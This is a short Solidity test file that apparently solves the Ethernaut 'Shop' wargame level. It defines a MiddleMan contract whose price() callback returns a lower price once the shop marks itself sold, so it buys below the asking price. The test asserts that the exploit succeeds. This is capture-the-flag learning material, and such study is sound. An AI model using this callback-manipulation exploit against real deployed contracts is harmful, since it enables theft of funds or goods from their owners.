// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Shop.sol";

contract MiddleMan is Buyer {
    // Buyer.price() is a view function, thus using isSold as the condition
    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : Shop(msg.sender).price();
    }

    function attack(address prey) public {
        Shop(prey).buy();
    }
}

// return price() differently
contract ShopTest is Test {
    Shop instance;

    function setUp() public {
        instance = new Shop();
    }

    function test() public {
        uint256 initialPrice = 100;
        assertEq(instance.price(), initialPrice);
        assertEq(instance.isSold(), false);

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack(address(instance));

        assertTrue(instance.price() < initialPrice);
        assertEq(instance.isSold(), true);
    }
}
